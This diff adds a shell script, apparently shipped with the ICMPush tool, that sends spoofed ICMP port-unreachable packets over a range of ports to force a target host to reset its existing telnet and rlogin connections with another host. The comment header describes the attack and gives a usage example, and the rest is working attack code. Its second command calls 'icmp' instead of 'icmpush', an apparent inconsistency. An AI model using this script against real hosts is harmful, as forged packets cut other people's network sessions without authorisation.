@@ -1,0 +1,44 @@
+#!/bin/sh
+#
+# Nasty script to send ICMP packets that verifies the returned
+# values from the ICMPush program :)
+# In this case to reset an existing rlogin or telnet connection.
+#
+# Example:
+#
+#        ./try_reset  LDG01  10.76.37.37  1200  2500
+#
+# This example send ICMP Unreach packets with source of LDG01 to 10.76.37.37
+# saying that the ports from 1200 to 2500 of LDG01 are unreachables.
+# This could make that the host 10.76.37.37 reset the connection of his
+# telnet port(23) or rlogin port(513) with the host LDG01 range port 1200-2500
+# Of course, the reset of an existing TCP connection caused by an ICMP
+# Unreach depends on the implementation of the TCP/IP stack of the host that
+# receives the ICMP.
+#
+# 
+if [ "$#" = 4 ]; then
+   for i in `cuenta $3 $4`
+   do
+     icmpush  -du  -sp $1  -c port-unreach  -prot tcp  -psrc 23  -pdst  $i  $2  1> /dev/null  2>&1
+     case $? in
+        0) echo "ICMP packet sent to host $2" ;;
+        2) echo "ICMP protocol not exists in /etc/protocols" ; exit ;;
+       11) echo "Spoof host $1 incorrect (name or IP address)" ; exit ;;
+       13) echo "Destination host $2 incorrect (name or IP address)" ; exit ;;
+        *) echo "Error while trying to send an ICMP packet to host $2" ;;
+     esac
+   
+     icmp  -du  -sp $1  -c port-unreach  -prot tcp  -psrc 513  -pdst  $i $2  1> /dev/null 2>&1
+     case $? in
+        0) echo "ICMP packet sent to host $2" ;;
+        2) echo "ICMP protocol not exists in /etc/protocols" ; exit ;;
+       11) echo "Spoof host $1 incorrect (name or IP address)" ; exit ;;
+       13) echo "Destination host $2 incorrect (name or IP address)" ; exit ;;
+        *) echo "Error while trying to send an ICMP packet to host $2" ;;
+     esac
+   done
+else
+   echo "Use:  $0  source_host  destination_host  begin_port  end_port"
+   exit;
+fi
